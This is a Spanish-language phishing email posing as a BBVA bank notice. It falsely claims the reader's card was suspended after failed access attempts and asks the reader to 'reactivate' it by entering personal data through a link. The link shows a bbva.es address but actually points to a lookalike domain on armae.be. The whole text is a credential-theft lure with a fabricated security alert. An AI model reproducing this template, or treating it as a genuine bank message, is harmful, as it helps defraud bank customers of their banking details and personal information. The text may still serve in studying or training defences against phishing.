 BBVA Estimado cliente de BBVA: Nosotros hemos determinado 2 tentativas equivocadas a la utilizacion de su tarjeta del usuario: 130.237.188.216 Sospechamos que esta tentativa no fue legitimada así, hemos tomado una medida de seguridad, y hemos suspendido temporalmente su tarjeta. Usted puede reactivar su tarjeta, verificando sus informaciones personales rellenando las casillias con sus datos personales que te pedimos. IMPORTANTE: Su tarjeta se quedará suspendida para prevenir el fraude hasta que usted la reactivará. Para reactivar su tarjeta haga click: http://www.bbva.es/TLBS/tlbs/esp/segmento/reactivar/tarjeta.html (http://w2.bbva.armae.be/.x.html) Banco Bilbao Vizcaya Argentaria, S.A. - 2010 